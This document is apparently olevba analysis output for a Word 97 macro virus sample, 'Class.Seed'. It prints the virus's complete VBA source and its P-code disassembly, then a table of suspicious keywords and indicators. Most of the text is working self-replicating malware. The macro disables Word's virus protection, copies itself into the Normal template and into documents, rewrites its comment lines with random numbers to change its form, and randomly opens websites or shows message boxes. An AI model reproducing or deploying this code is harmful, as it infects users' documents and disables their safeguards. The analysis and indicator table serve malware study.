olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.x - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'23588045056453076767361,06871952023145E+21235880450564530767673623588045056
Randomize
'15732183184498298470767,83932282230339E+20157321831844982984707615732183184
s = 0: r = 0
'2431821924927018164416,57033645827909E+1924318219249270181644124318219249
On Error GoTo 87
'785849089753991189215,92523289154705E+1978584908975399118921785849089
Options.VirusProtection = False
'2268712161818131609001,8561051306368E+202268712161818131609002268712161
Options.SaveNormalPrompt = False
'267806250016996655294,55181051575756E+18267806250016996655292678062500
Options.ConfirmConversions = False
'4672542736797712238443,72734452514112E+204672542736797712238444672542736
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'183835633961400672252,5749347104893E+181838356339614006722518383563396
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'1053517488119618698492,06686419529761E+1910535174881196186984910535174881
If xf > 90 And fx > 0 Then GoTo 87
'6673092721114509260817,64130914798302E+196673092721114509260816673092721
If xf < 90 Then
'741854169320671393292,37891409991225E+1974185416932067139329741854169
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'915909696652485718445,97617996020722E+1991590969665248571844915909696
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'12000107025500251375696,00307004768348E+20120001070255002513756912000107025
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'28738725625338482724419,72756214562148E+20287387256253384827244128738725625
End If
'846868201343498035692,90897563531824E+1984686820134349803569846868201
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'7862191561187079477291,47085468758573E+207862191561187079477297862191561
k = Int(Rnd(1) * 100) + 1
'37614275136234601298898,82435780371143E+20376142751362346012988937614275136
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'314778564559530639361,76128251171743E+1931477856455953063936314778564
l = Int(Rnd(1) * 75) + 1
'2318326201711571630091,64965515392593E+202318326201711571630092318326201
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'6181733376412715477162,55129703995174E+206181733376412715477166181733376
m = Int(Rnd(1) * 50) + 1
'10434009609341118736363,55923617299018E+20104340096093411187363610434009609
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'39586673296824700549763,26471512303807E+21395866732968247005497639586673296
n = Int(Rnd(1) * 25) + 1
'1911803982428993917165,54306862918637E+1919118039824289939171619118039824
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'5947957129749719161004,45929742841785E+205947957129749719161005947957129
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'14189812641145762158242,06833771557339E+20141898126411457621582414189812641
With xs.codemodule
'197936761747929512891,48042745237754E+1919793676174792951289197936761
    For poly = 1 To 4
'16139669764165215032962,66651607202278E+20161396697641652150329616139669764
    .deletelines 1
'27010265104238968313966,4545975115155E+20270102651042389683139627010265104
    Next poly
'22662291600461841590251,04663887912532E+21226622916004618415902522662291600
End With
'1768707136365333527696,46168017445357E+191768707136365333527691768707136
If xf < 90 Then
'15808284361275606481964,3568656385585E+20158082843612756064819615808284361
    With xs.codemodule
'1384928848944515584006,16509165072313E+1913849288489445155840013849288489
    .replaceline 1, "Sub AutoClose()"
'827827984293903020962,43301145332827E+1982782798429390302096827827984
    .replaceline 93, "Sub ToolsMacro()"
'40863005316560789761002,29155549849014E+21408630053165607897610040863005316
    End With
'372142681489011304961,81981978067123E+1937214268148901130496372142681
End If
'15795211041475462386017,51002872908536E+20157952110414754623860115795211041
With xs.codemodule
'521939716212229537611,10771024586975E+1952193971621222953761521939716
    For poly = 2 To 92 Step 2
'357197475687441201003,12337762606322E+19357197475687441201003571974756
    r = Int(Rnd(412835) * 203989) + 8485
'325225156001893651216,15863010181839E+183252251560018936512132522515600
    s = Int(Rnd(384958) * 285865) + 2988
'548947628178062526094,28522385405999E+19548947628178062526095489476281
    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r
'154990050258680683691,34541960131746E+191549900502586806836915499005025
Next poly
'23250150400470777166761,09456399320559E+21232501504004707771667623250150400
End With
'20514832900462847893219,4952471873202E+20205148329004628478932120514832900
87:
'3118887409826361262252,57732773611687E+203118887409826361262253118887409
If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'22545022500274687531696,19283658242051E+20225450225002746875316922545022500
End Sub
'2713368100693853549211,88268008649819E+202713368100693853549212713368100
Sub ToolsMacro()
'Word97/Class.Seed by Virus :)
End Sub


















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.x
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 16903 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x004B "23588045056453076767361,06871952023145E+21235880450564530767673623588045056"
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	QuoteRem 0x0000 0x004B "15732183184498298470767,83932282230339E+20157321831844982984707615732183184"
' Line #4:
' 	LitDI2 0x0000 
' 	St s 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St r 
' Line #5:
' 	QuoteRem 0x0000 0x0049 "2431821924927018164416,57033645827909E+1924318219249270181644124318219249"
' Line #6:
' 	OnError 87 
' Line #7:
' 	QuoteRem 0x0000 0x0045 "785849089753991189215,92523289154705E+1978584908975399118921785849089"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x0047 "2268712161818131609001,8561051306368E+202268712161818131609002268712161"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0046 "267806250016996655294,55181051575756E+18267806250016996655292678062500"
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0048 "4672542736797712238443,72734452514112E+204672542736797712238444672542736"
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St fx 
' Line #15:
' 	QuoteRem 0x0000 0x0046 "183835633961400672252,5749347104893E+181838356339614006722518383563396"
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xf 
' Line #17:
' 	QuoteRem 0x0000 0x0049 "1053517488119618698492,06686419529761E+1910535174881196186984910535174881"
' Line #18:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 87 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0048 "6673092721114509260817,64130914798302E+196673092721114509260816673092721"
' Line #20:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Lt 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0045 "741854169320671393292,37891409991225E+1974185416932067139329741854169"
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' Line #23:
' 	QuoteRem 0x0000 0x0045 "915909696652485718445,97617996020722E+1991590969665248571844915909696"
' Line #24:
' 	Ld xs 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #25:
' 	QuoteRem 0x0000 0x004B "12000107025500251375696,00307004768348E+20120001070255002513756912000107025"
' Line #26:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' 	QuoteRem 0x0000 0x004B "28738725625338482724419,72756214562148E+20287387256253384827244128738725625"
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x0045 "846868201343498035692,90897563531824E+1984686820134349803569846868201"
' Line #30:
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x0048 "7862191561187079477291,47085468758573E+207862191561187079477297862191561"
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #33:
' 	QuoteRem 0x0000 0x004B "37614275136234601298898,82435780371143E+20376142751362346012988937614275136"
' Line #34:
' 	Ld k 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x001E "http://www.cannabisculture.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #35:
' 	QuoteRem 0x0000 0x0045 "314778564559530639361,76128251171743E+1931477856455953063936314778564"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #37:
' 	QuoteRem 0x0000 0x0048 "2318326201711571630091,64965515392593E+202318326201711571630092318326201"
' Line #38:
' 	Ld l 
' 	LitDI2 0x004A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0018 "http://www.Microsoft.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0048 "6181733376412715477162,55129703995174E+206181733376412715477166181733376"
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' Line #41:
' 	QuoteRem 0x0000 0x004B "10434009609341118736363,55923617299018E+20104340096093411187363610434009609"
' Line #42:
' 	Ld m 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #43:
' 	QuoteRem 0x0000 0x004B "39586673296824700549763,26471512303807E+21395866732968247005497639586673296"
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #45:
' 	QuoteRem 0x0000 0x0049 "1911803982428993917165,54306862918637E+1919118039824289939171619118039824"
' Line #46:
' 	Ld n 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #47:
' 	QuoteRem 0x0000 0x0048 "5947957129749719161004,45929742841785E+205947957129749719161005947957129"
' Line #48:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	Ld xs 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x004B "14189812641145762158242,06833771557339E+20141898126411457621582414189812641"
' Line #50:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #51:
' 	QuoteRem 0x0000 0x0045 "197936761747929512891,48042745237754E+1919793676174792951289197936761"
' Line #52:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #53:
' 	QuoteRem 0x0000 0x004B "16139669764165215032962,66651607202278E+20161396697641652150329616139669764"
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #55:
' 	QuoteRem 0x0000 0x004A "27010265104238968313966,4545975115155E+20270102651042389683139627010265104"
' Line #56:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	QuoteRem 0x0000 0x004B "22662291600461841590251,04663887912532E+21226622916004618415902522662291600"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x0048 "1768707136365333527696,46168017445357E+191768707136365333527691768707136"
' Line #60:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Lt 
' 	IfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x004A "15808284361275606481964,3568656385585E+20158082843612756064819615808284361"
' Line #62:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #63:
' 	QuoteRem 0x0000 0x0049 "1384928848944515584006,16509165072313E+1913849288489445155840013849288489"
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #65:
' 	QuoteRem 0x0000 0x0045 "827827984293903020962,43301145332827E+1982782798429390302096827827984"
' Line #66:
' 	LitDI2 0x005D 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	QuoteRem 0x0000 0x004B "40863005316560789761002,29155549849014E+21408630053165607897610040863005316"
' Line #68:
' 	EndWith 
' Line #69:
' 	QuoteRem 0x0000 0x0045 "372142681489011304961,81981978067123E+1937214268148901130496372142681"
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	QuoteRem 0x0000 0x004B "15795211041475462386017,51002872908536E+20157952110414754623860115795211041"
' Line #72:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #73:
' 	QuoteRem 0x0000 0x0045 "521939716212229537611,10771024586975E+1952193971621222953761521939716"
' Line #74:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x005C 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #75:
' 	QuoteRem 0x0000 0x0046 "357197475687441201003,12337762606322E+19357197475687441201003571974756"
' Line #76:
' 	LitDI4 0x4CA3 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x1CD5 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St r 
' Line #77:
' 	QuoteRem 0x0000 0x0047 "325225156001893651216,15863010181839E+183252251560018936512132522515600"
' Line #78:
' 	LitDI4 0xDFBE 0x0005 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x5CA9 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St s 
' Line #79:
' 	QuoteRem 0x0000 0x0046 "548947628178062526094,28522385405999E+19548947628178062526095489476281"
' Line #80:
' 	Ld poly 
' 	LitStr 0x0001 "'"
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld s 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Ld s 
' 	Mul 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld s 
' 	Ld s 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #81:
' 	QuoteRem 0x0000 0x0047 "154990050258680683691,34541960131746E+191549900502586806836915499005025"
' Line #82:
' 	StartForVariable 
' 	Ld poly 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	QuoteRem 0x0000 0x004B "23250150400470777166761,09456399320559E+21232501504004707771667623250150400"
' Line #84:
' 	EndWith 
' Line #85:
' 	QuoteRem 0x0000 0x004A "20514832900462847893219,4952471873202E+20205148329004628478932120514832900"
' Line #86:
' 	LineNum 87 
' 	BoS 0x0000 
' Line #87:
' 	QuoteRem 0x0000 0x0048 "3118887409826361262252,57732773611687E+203118887409826361262253118887409"
' Line #88:
' 	Ld xf 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #89:
' 	QuoteRem 0x0000 0x004B "22545022500274687531696,19283658242051E+20225450225002746875316922545022500"
' Line #90:
' 	EndSub 
' Line #91:
' 	QuoteRem 0x0000 0x0048 "2713368100693853549211,88268008649819E+202713368100693853549212713368100"
' Line #92:
' 	FuncDefn (Sub ToolsMacro())
' Line #93:
' 	QuoteRem 0x0000 0x001D "Word97/Class.Seed by Virus :)"
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

